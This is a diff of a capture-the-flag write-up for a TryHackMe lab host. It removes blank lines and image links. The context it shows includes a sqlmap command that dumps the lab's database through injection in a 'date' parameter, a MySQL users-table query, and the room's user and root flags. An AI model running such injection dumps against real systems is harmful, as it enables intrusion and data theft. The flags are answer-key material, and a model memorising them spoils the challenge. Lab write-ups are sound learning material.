@@ -170,7 +170,6 @@ Referer: http://contacttracer.thm/admin/?page=reports
 Cookie: PHPSESSID=1aj9i4o2ka9uecaufbqj6gu7mu
 Upgrade-Insecure-Requests: 1
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ sqlmap -r req_covid.txt --dump -p date
         ___
@@ -487,7 +486,6 @@ select * from users;
 +----+--------------+----------+----------+----------+-------------------------------------+------------+---------------------+---------------------+
 1 row in set (0.00 sec)
 
-
 asshh is cz i changed the pass of admin
 
 mysql> select * from users;
@@ -746,10 +744,6 @@ THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}
 
 ```
 
-![[Pasted image 20230704220727.png]]
-
-![[Pasted image 20230704222608.png]]
-
 What is the user flag?
 
 *THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}*
@@ -757,6 +751,5 @@ What is the user flag?
 What is the root flag?
 
 *THM{IQ23Em4VGX91cvxsIzatpUvrW9GZZJxm}*
-
 
 [[battery]]
